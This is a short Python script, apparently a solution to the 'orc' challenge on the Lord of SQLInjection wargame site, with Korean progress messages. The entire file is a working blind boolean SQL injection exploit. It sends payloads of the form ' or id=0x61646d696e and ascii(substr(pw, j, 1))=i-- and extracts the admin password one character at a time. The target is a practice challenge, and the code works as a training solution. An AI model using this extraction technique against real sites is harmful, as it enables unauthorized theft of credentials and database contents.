import requests

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookies = {'PHPSESSID': 'SESSION'}#세션
password = ""

for j in range(1, 11): 
    found = False
    for i in range(32, 127): 
        query = f"' or id=0x61646d696e and ascii(substr(pw, {j}, 1))={i}-- "
        res = requests.get(url, params={'pw': query}, cookies=cookies)
        
        if "Hello admin" in res.text:
            password += chr(i)
            print(f"{j}번째 글자 찾음: {chr(i)} (현재까지: {password})")
            found = True
            break
    
    if not found: 
        break

print(f"최종 비밀번호: {password}")